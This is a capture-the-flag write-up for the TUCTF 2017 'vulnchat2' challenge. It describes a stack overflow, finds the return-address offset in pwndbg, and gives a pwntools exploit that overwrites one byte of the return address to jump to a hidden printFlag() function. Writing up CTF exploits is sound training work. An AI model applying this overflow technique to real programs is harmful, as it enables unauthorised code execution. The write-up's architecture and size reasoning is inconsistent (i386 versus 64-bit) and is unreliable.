---
layout: post
title: Tuctf 2017 vulnchat2
date: 2025-07-26 01:22:03 +0300
categories: Nightmare-series partial-overwrite
tags: nightmare buffer-overflow i386 partial-overwrite 
---

## Information 
- category: pwn

## Description 
> None

## Write-up

### Binary Analysis 
From reverse engineering the binary, we identified a function named `doThing()` that contains a call to the `read()` function. It reads **45 bytes** from standard input into a local stack buffer:
```plaintext
ssize_t n = read(0, buf, 45);
```
Additionally, we discovered a **hidden function** called `printFlag()` which is not directly called in normal execution but can be reached through exploitation.

### Vulnerability 
The buffer that `read()` writes into is located on the stack. Since the function doesn't enforce bounds checking beyond the 45-byte `read()`, and there’s a return address following the buffer, we can exploit this to perform a **partial overwrite** of the saved return address.


### Exploitation Strategy 
- **Goal**: Redirect execution to `printFlag()`. 
- **Method**: Partial overwrite of the least significant byte (LSB) of the return address to point into `printFlag`. 
- **Why Partial?** The input is limited to 45 bytes, which is not enough to fully overwrite the return address. But because ASLR doesn't randomize all bits in 64-bit addresses, and the binary has a predictable layout (probably PIE disabled), we can **overwrite just the last byte** of the return address to land inside `printFlag`.

### Offset Discovery 
Using `pwndbg` in GDB, we examined the stack layout at the point of the `read()` call in `doThing()`:”
```bash
pwndbg> i f
Stack level 0, frame at 0x7fffffffdf40:
 rip = 0x401310 in doThing; saved rip = 0x401369
...
pwndbg> dist $rax 0x7fffffffdf38
0x7fffffffdef0->0x7fffffffdf38 is 0x2b bytes (43 in decimal)
```
This confirms the **offset to the return address is 43 bytes**.


### Final Exploit Concept 
To exploit the program: 
- Send **43 bytes** of padding to reach the return address. 
- Follow it with **1 byte** that matches the low byte of `printFlag()` address ( `0x72` if its address ends in `0x...72`). 
- This causes the return address to be partially overwritten to point to `printFlag()`. This partial overwrite is enough to gain code execution and leak the flag.


## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln-chat2.0_patched")

context.binary = exe


def conn():

    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r)

    return r

def main():
    r = conn()

    fixed_low = b"\x72"
    offset_ret = 43

    payload = b"A"*offset_ret 
    payload+= fixed_low

    r.sendline(b"AAAA")
    sleep(4)
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
```

## Flag
> Flag:``` flag{g0ttem_b0yz}```


















